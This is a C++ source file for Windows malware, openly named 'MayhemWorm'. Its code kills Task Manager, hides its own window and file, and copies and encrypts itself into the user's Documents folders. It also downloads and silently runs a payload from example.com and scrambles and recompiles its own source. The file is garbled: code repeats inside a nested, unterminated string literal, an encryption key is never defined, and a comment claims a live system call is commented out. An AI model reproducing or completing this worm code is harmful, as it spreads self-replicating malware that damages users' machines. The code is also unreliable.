#include <iostream>
#include <vector>
#include <cstdlib>
#include <fstream>
#include <random>
#include <chrono>
#include <ctime>
#include <filesystem>
#include <unordered_map>
#include <Windows.h>
#include <thread>

using namespace std;
namespace fs = filesystem;

struct ASTNode {
    std::string type;
    std::vector<ASTNode*> children;
    std::unordered_map<std::string, std::string> attributes;

    ASTNode(std::string t, std::vector<ASTNode*> c) : type(t), children(c) {}

    std::string getAttribute(const std::string& attributeName) {
        auto it = attributes.find(attributeName);
        if (it != attributes.end()) {
            return it->second;
        } else {
            return "";
        }
    }
};

class MayhemWorm {
public:
    void deleteAST(ASTNode* root);
    void applyCodeTemplates(ASTNode* root);
    void mutateCode();
    void initiateMayhem();

private:
    void applyRandomTemplate(ASTNode* node);
    bool executeAsync(const string& command);

    std::vector<std::string> availableTemplates = {
        "Template_A",
        "Template_B",
        "Template_C"
        // Add more templates as needed
    };
};

bool MayhemWorm::executeAsync(const string& command) {
    int result = system((command + " &").c_str());

    if (result == 0) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        return true;
    } else {
        return false;
    }
}

void MayhemWorm::initiateMayhem() {
    cout << "Initiating mayhem..." << endl;

    // Get the current executable's directory
    fs::path executablePath = fs::canonical(fs::absolute(fs::path(__argv[0])));
    executablePath = executablePath.parent_path();

    // Run "heeya.exe"
    string heeyaPath = (executablePath / "heeya.exe").string();
    if (fs::exists(heeyaPath)) {
        cout << "Running heeya.exe..." << endl;
        if (executeAsync(heeyaPath)) {
            cout << "heeya.exe executed successfully." << endl;
        } else {
            cerr << "Failed to execute heeya.exe." << endl;
        }
    } else {
        cerr << "heeya.exe not found." << endl;
    }

    // Run "text.exe"
    string textPath = (executablePath / "text.exe").string();
    if (fs::exists(textPath)) {
        cout << "Running text.exe..." << endl;
        if (executeAsync(textPath)) {
            cout << "text.exe executed successfully." << endl;
        } else {
            cerr << "Failed to execute text.exe." << endl;
        }
    } else {
        cerr << "text.exe not found." << endl;
    }

    // Other mayhem actions...

    cout << "Mayhem initiated." << endl;
}

void MayhemWorm::deleteAST(ASTNode* root) {
    if (!root)
        return;

    for (auto child : root->children) {
        deleteAST(child);
    }

    if (root->type == "deleteable_node_type" && root->children.size() > 0) {
        if (root->getAttribute("additional_attribute") == "desired_value") {
            for (auto child : root->children) {
                delete child;
            }
            root->children.clear();
            delete root;
        }
    }
}

void MayhemWorm::applyCodeTemplates(ASTNode* root) {
    for (auto node : root->children) {
        if (node->type == "insertion_point_type" && node->children.size() == 0) {
            if (node->type == "specific_type" && node->getAttribute("attribute_name") == "desired_value") {
                applyRandomTemplate(node);
            }
        }

        applyCodeTemplates(node);
    }
}

void MayhemWorm::mutateCode() {
    std::string filename = "mayhem_worm_mutator.cpp";
    std::ifstream inFile(filename);
    std::string fileContent((std::istreambuf_iterator<char>(inFile)),
                             std::istreambuf_iterator<char>());
    inFile.close();

    std::random_device rd;
    std::mt19937 g(rd());
    std::uniform_int_distribution<int> dis(0, fileContent.size() - 1);

    for (int i = 0; i < fileContent.size() / 10; ++i) {
        int pos1 = dis(g);
        int pos2 = dis(g);
        std::swap(fileContent[pos1], fileContent[pos2]);
    }

    std::ofstream outFile(filename);
    outFile << fileContent;
    outFile.close();

    system("g++ mayhem_worm.cpp -o mayhem_worm");
}

void MayhemWorm::applyRandomTemplate(ASTNode* node) {
    if (node == nullptr) {
        std::cerr << "Error: Null node provided." << std::endl;
        return;
    }

    if (node->children.empty()) {
        std::cerr << "No children to apply templates." << std::endl;
        return;
    }

    std::srand(static_cast<unsigned int>(std::time(nullptr)));

    int templateIndex = std::rand() % availableTemplates.size();

    std::string selectedTemplate = availableTemplates[templateIndex];
    std::cout << "Applying template: " << selectedTemplate << std::endl;

    node->type = selectedTemplate;

    std::cout << "Template applied successfully." << std::endl;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

const wchar_t* CLASS_NAME = L"MayhemWindowClass";

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    WNDCLASSW wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    RegisterClassW(&wc);

    HWND hwnd = CreateWindowExW(
        0,
        CLASS_NAME,
        L"Mayhem Unleashed",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 800, 600,
        NULL, NULL, hInstance, NULL
    );

    if (hwnd == NULL) {
        return 0;
    }

    ShowWindow(hwnd, nCmdShow);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return static_cast<int>(msg.wParam);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProcW(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}



std::string generateMutatedCode() {
    return R"(
#include <iostream>
#include <vector>
#include <filesystem>
#include <Windows.h>
#include <thread>
#include <fstream>
#include <chrono>
#include <ctime>
#include <urlmon.h>
#include <wininet.h>
#include <TlHelp32.h>
#include <openssl/aes.h>
#include <random>
#include <string>
#include <curl/curl.h>
#include <libxml/parser.h>
#include <libssh/libssh.h>
#include <httplib.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")

namespace fs = std::filesystem;

class Worm {
public:
    virtual ~Worm() {}
    virtual void replicate() {
        std::cout << "Worm replicated!\n";
    }

    static int getNumInstances() {
        return numInstances;
    }

    void replicateInstances(int n) {
        for (int i = 0; i < n; ++i) {
            replicate();
        }
    }

    void traverseFileSystem(const std::string& directory) {
        for (const auto& entry : fs::directory_iterator(directory)) {
            std::cout << "File: " << entry.path().string() << "\n";
        }
    }

protected:
    static int numInstances;
};

int Worm::numInstances = 0;

class MayhemWorm : public Worm {
public:
    void replicate() override {
        Worm::replicate();
        mutateCode();
        initiateMayhem();
    }

    void initiateMayhem();

    void downloadAndExecute(const std::string& url, const std::string& destination);

    void obscuredEntryPoint();

private:
    void encryptCode(const std::string& filename, const unsigned char* key);

    void decryptCode(const std::string& filename, const unsigned char* key);

    void mutateCode();
};

void MayhemWorm::initiateMayhem() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_MINIMIZE);
    SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED);
    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(processSnapshot, &processEntry)) {
        do {
            if (rand() % 2 == 0 && _stricmp(processEntry.szExeFile, "Taskmgr.exe") == 0) {
                HANDLE processHandle = OpenProcess(PROCESS_TERMINATE, 0, processEntry.th32ProcessID);
                TerminateProcess(processHandle, 0);
                CloseHandle(processHandle);
            }
        } while (Process32Next(processSnapshot, &processEntry));
    }

    CloseHandle(processSnapshot);

    SetFileAttributes("C:\\Users\\User\\Documents\\worm.exe",
                      FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ENCRYPTED);

    std::vector<std::string> crypticDirectories;
    for (const auto& entry : fs::directory_iterator("C:\\Users\\User\\Documents")) {
        if (fs::is_directory(entry.path())) {
            crypticDirectories.push_back(entry.path().string());
        }
    }
    for (const auto& crypticDir : crypticDirectories) {
        std::string obscureWormName =
            crypticDir + "\\worm_" + std::to_string(std::time(nullptr)) + ".exe";
        fs::copy_file("worm.exe", obscureWormName, fs::copy_options::overwrite_existing);
        encryptCode(obscureWormName, encryptionKey);
    }

    std::thread chaosThread([this]() {
        std::this_thread::sleep_for(std::chrono::minutes(1));
    });
    chaosThread.detach();

    std::string downloadUrl = "https://example.com/payload.exe";
    std::string downloadDestination = "C:\\Downloads\\text.exe";
    downloadAndExecute(downloadUrl, downloadDestination);

    while (true) {
        std::this_thread::sleep_for(std::chrono::minutes(1));
    }
}

void MayhemWorm::downloadAndExecute(const std::string& url, const std::string& destination) {
    URLDownloadToFile(NULL, url.c_str(), destination.c_str(), 0, NULL);
    ShellExecute(NULL, "open", destination.c_str(), NULL, NULL, SW_HIDE);
}

void MayhemWorm::obscuredEntryPoint() {
    initiateMayhem();
}

void MayhemWorm::encryptCode(const std::string& filename, const unsigned char* key) {
    std::ifstream inFile(filename, std::ios::binary);
    std::ofstream outFile(filename + ".encrypted", std::ios::binary);

    unsigned char iv[AES_BLOCK_SIZE];
    memset(iv, 0x00, AES_BLOCK_SIZE);

    AES_KEY aesKey;
    AES_set_encrypt_key(key, 128, &aesKey);

    unsigned char inBuffer[AES_BLOCK_SIZE];
    unsigned char outBuffer[AES_BLOCK_SIZE];

    while (inFile.read(reinterpret_cast<char*>(inBuffer), AES_BLOCK_SIZE)) {
        AES_cbc_encrypt(inBuffer, outBuffer, AES_BLOCK_SIZE, &aesKey, iv, AES_ENCRYPT);
        outFile.write(reinterpret_cast<char*>(outBuffer), AES_BLOCK_SIZE);
    }

    inFile.close();
    outFile.close();
}

void MayhemWorm::decryptCode(const std::string& filename, const unsigned char* key) {
    std::ifstream inFile(filename + ".encrypted", std::ios::binary);
    std::ofstream outFile(filename, std::ios::binary);

    unsigned char iv[AES_BLOCK_SIZE];
    memset(iv, 0x00, AES_BLOCK_SIZE);

    AES_KEY aesKey;
    AES_set_decrypt_key(key, 128, &aesKey);

    unsigned char inBuffer[AES_BLOCK_SIZE];
    unsigned char outBuffer[AES_BLOCK_SIZE];

    while (inFile.read(reinterpret_cast<char*>(inBuffer), AES_BLOCK_SIZE)) {
        AES_cbc_encrypt(inBuffer, outBuffer, AES_BLOCK_SIZE, &aesKey, iv, AES_DECRYPT);
        outFile.write(reinterpret_cast<char*>(outBuffer), AES_BLOCK_SIZE);
    }

    inFile.close();
    outFile.close();
}

void MayhemWorm::mutateCode() {
    std::string filename = "mayhem_worm_mutator.cpp";
    std::ifstream inFile(filename);
    std::string fileContent((std::istreambuf_iterator<char>(inFile)),
                             std::istreambuf_iterator<char>());
    inFile.close();

    std::random_device rd;
    std::mt19937 g(rd());
    std::uniform_int_distribution<int> dis(0, fileContent.size() - 1);

    for (int i = 0; i < fileContent.size() / 10; ++i) {
        int pos1 = dis(g);
        int pos2 = dis(g);
        std::swap(fileContent[pos1], fileContent[pos2]);
    }

    std::ofstream outFile(filename);
    outFile << fileContent;
    outFile.close();

    system("g++ mayhem_worm.cpp -o mayhem_worm"); // Commented out to prevent accidental compilation
}

std::string generateMutatedCode() {
    return R"(
    #include <iostream>
#include <vector>
#include <filesystem>
#include <Windows.h>
#include <thread>
#include <fstream>
#include <chrono>
#include <ctime>
#include <urlmon.h>
#include <wininet.h>
#include <TlHelp32.h>
#include <openssl/aes.h>
#include <random>
#include <string>
#include <curl/curl.h>
#include <libxml/parser.h>
#include <libssh/libssh.h>
#include <httplib.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")

namespace fs = std::filesystem;

class Worm {
public:
    virtual ~Worm() {}
    virtual void replicate() {
        std::cout << "Worm replicated!\n";
    }

    static int getNumInstances() {
        return numInstances;
    }

    void replicateInstances(int n) {
        for (int i = 0; i < n; ++i) {
            replicate();
        }
    }

    void traverseFileSystem(const std::string& directory) {
        for (const auto& entry : fs::directory_iterator(directory)) {
            std::cout << "File: " << entry.path().string() << "\n";
        }
    }

protected:
    static int numInstances;
};

int Worm::numInstances = 0;

class MayhemWorm : public Worm {
public:
    void replicate() override {
        Worm::replicate();
        mutateCode();
        initiateMayhem();
    }

    void initiateMayhem();

    void downloadAndExecute(const std::string& url, const std::string& destination);

    void obscuredEntryPoint();

private:
    void encryptCode(const std::string& filename, const unsigned char* key);

    void decryptCode(const std::string& filename, const unsigned char* key);

    void mutateCode();
};

void MayhemWorm::initiateMayhem() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_MINIMIZE);
    SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED);
    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(processSnapshot, &processEntry)) {
        do {
            if (rand() % 2 == 0 && _stricmp(processEntry.szExeFile, "Taskmgr.exe") == 0) {
                HANDLE processHandle = OpenProcess(PROCESS_TERMINATE, 0, processEntry.th32ProcessID);
                TerminateProcess(processHandle, 0);
                CloseHandle(processHandle);
            }
        } while (Process32Next(processSnapshot, &processEntry));
    }

    CloseHandle(processSnapshot);

    SetFileAttributes("C:\\Users\\User\\Documents\\worm.exe",
                      FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ENCRYPTED);

    std::vector<std::string> crypticDirectories;
    for (const auto& entry : fs::directory_iterator("C:\\Users\\User\\Documents")) {
        if (fs::is_directory(entry.path())) {
            crypticDirectories.push_back(entry.path().string());
        }
    }
    for (const auto& crypticDir : crypticDirectories) {
        std::string obscureWormName =
            crypticDir + "\\worm_" + std::to_string(std::time(nullptr)) + ".exe";
        fs::copy_file("worm.exe", obscureWormName, fs::copy_options::overwrite_existing);
        encryptCode(obscureWormName, encryptionKey);
    }

    std::thread chaosThread([this]() {
        std::this_thread::sleep_for(std::chrono::minutes(1));
    });
    chaosThread.detach();

    std::string downloadUrl = "https://example.com/payload.exe";
    std::string downloadDestination = "C:\\Downloads\\heeya.exe";
    downloadAndExecute(downloadUrl, downloadDestination);

    while (true) {
        std::this_thread::sleep_for(std::chrono::minutes(1));
    }
}

void MayhemWorm::downloadAndExecute(const std::string& url, const std::string& destination) {
    URLDownloadToFile(NULL, url.c_str(), destination.c_str(), 0, NULL);
    ShellExecute(NULL, "open", destination.c_str(), NULL, NULL, SW_HIDE);
}

void MayhemWorm::obscuredEntryPoint() {
    initiateMayhem();
}

void MayhemWorm::encryptCode(const std::string& filename, const unsigned char* key) {
    std::ifstream inFile(filename, std::ios::binary);
    std::ofstream outFile(filename + ".encrypted", std::ios::binary);

    unsigned char iv[AES_BLOCK_SIZE];
    memset(iv, 0x00, AES_BLOCK_SIZE);

    AES_KEY aesKey;
    AES_set_encrypt_key(key, 128, &aesKey);

    unsigned char inBuffer[AES_BLOCK_SIZE];
    unsigned char outBuffer[AES_BLOCK_SIZE];

    while (inFile.read(reinterpret_cast<char*>(inBuffer), AES_BLOCK_SIZE)) {
        AES_cbc_encrypt(inBuffer, outBuffer, AES_BLOCK_SIZE, &aesKey, iv, AES_ENCRYPT);
        outFile.write(reinterpret_cast<char*>(outBuffer), AES_BLOCK_SIZE);
    }

    inFile.close();
    outFile.close();
}

void MayhemWorm::decryptCode(const std::string& filename, const unsigned char* key) {
    std::ifstream inFile(filename + ".encrypted", std::ios::binary);
    std::ofstream outFile(filename, std::ios::binary);

    unsigned char iv[AES_BLOCK_SIZE];
    memset(iv, 0x00, AES_BLOCK_SIZE);

    AES_KEY aesKey;
    AES_set_decrypt_key(key, 128, &aesKey);

    unsigned char inBuffer[AES_BLOCK_SIZE];
    unsigned char outBuffer[AES_BLOCK_SIZE];

    while (inFile.read(reinterpret_cast<char*>(inBuffer), AES_BLOCK_SIZE)) {
        AES_cbc_encrypt(inBuffer, outBuffer, AES_BLOCK_SIZE, &aesKey, iv, AES_DECRYPT);
        outFile.write(reinterpret_cast<char*>(outBuffer), AES_BLOCK_SIZE);
    }

    inFile.close();
    outFile.close();
}

void MayhemWorm::mutateCode() {
    std::string filename = "mayhem_worm_mutator.cpp";
    std::ifstream inFile(filename);
    std::string fileContent((std::istreambuf_iterator<char>(inFile)),
                             std::istreambuf_iterator<char>());
    inFile.close();

    std::random_device rd;
    std::mt19937 g(rd());
    std::uniform_int_distribution<int> dis(0, fileContent.size() - 1);

    for (int i = 0; i < fileContent.size() / 10; ++i) {
        int pos1 = dis(g);
        int pos2 = dis(g);
        std::swap(fileContent[pos1], fileContent[pos2]);
    }

    std::ofstream outFile(filename);
    outFile << fileContent;
    outFile.close();

    system("g++ mayhem_worm.cpp -o mayhem_worm"); // Commented out to prevent accidental compilation
}

std::string generateMutatedCode()

)";
}
